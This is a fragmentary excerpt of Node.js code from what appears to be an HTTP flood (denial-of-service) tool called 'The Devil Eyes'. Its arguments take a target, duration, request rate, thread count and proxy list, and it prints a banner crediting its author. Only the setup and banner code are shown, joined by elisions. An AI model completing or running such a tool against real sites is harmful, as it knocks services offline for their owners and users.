...
'gzip, identity',
 ...
 if (process.argv.length < 7) {
  console.log('node The Devil Eyes target time rate thread proxy'.rainbow);
  process.exit();
}
 const headers = {};
...
const targetPort = parsedTarget.protocol === 'https:' ? 443 : 80;
    ...
    console.clear();
console.log('Script By : @Donna22xa With Love'.bgRed.blue);
console.log(`Target : ${parsedTarget.host}`.bgRed.green);
console.log(`Time : ${args.time.toString()} Second`.bgRed.green);
console.log(`Thread(s) : ${args.threads.toString()}`.bgRed.green);
console.log(`Rate : ${args.Rate.toString()}`.bgRed.green);
console.log(`ProxyFile: ${args.proxyFile} | Total : ${proxies.length}`.bgRed.white);
  setTimeout(() => {
    process.exit(1);
  }, process.argv[3] * 1000);
